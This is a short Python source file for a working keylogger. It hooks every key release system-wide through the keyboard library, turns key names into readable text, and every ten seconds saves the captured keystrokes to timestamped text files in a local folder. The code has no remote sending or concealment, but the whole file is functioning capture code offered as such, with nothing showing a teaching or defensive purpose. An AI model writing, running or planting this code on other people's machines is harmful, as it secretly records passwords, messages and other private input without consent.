import keyboard
from threading import Timer
from datetime import datetime


class KeyLogger:
    
    def __init__(self, interval):
        self.interval = interval

        self.log = ''
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()


    def callback(self, event):
        name = event.name 
        if len(name) > 1:
            if name == 'space': name = ' '
            elif name == 'enter': name = '[ENTER]\n'
            elif name == 'decimal': name = '.'
            else:
                name = name.replace(' ', '_')
                name = f'[{name.upper()}]'
        self.log += name


    def name_file(self):
        start_dt_str = str(self.start_dt)[:-7].replace(' ', '-').replace(':', '')
        end_dt_str = str(self.end_dt)[:-7].replace(' ', '-').replace(':', '')
        filename = f'{start_dt_str}__{end_dt_str}'
        return filename


    def report_file(self):
        filename = self.name_file()
        with open(f'test/{filename}.txt', 'w') as f:
            print(self.log, file=f)
        print(f'Сохранение {filename}.txt')


    def report(self):
        if self.log:
            self.end_dt = datetime.now()
            self.report_file()
            self.start_dt = datetime.now()
        
        self.log = ''
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    
    def start(self):
        self.start_dt = datetime.now()
        keyboard.on_release(callback=self.callback)
        self.report()
        keyboard.wait()


if __name__ == '__main__':
    send_report_every = 10

    keylogger = KeyLogger(send_report_every)
    keylogger.start()
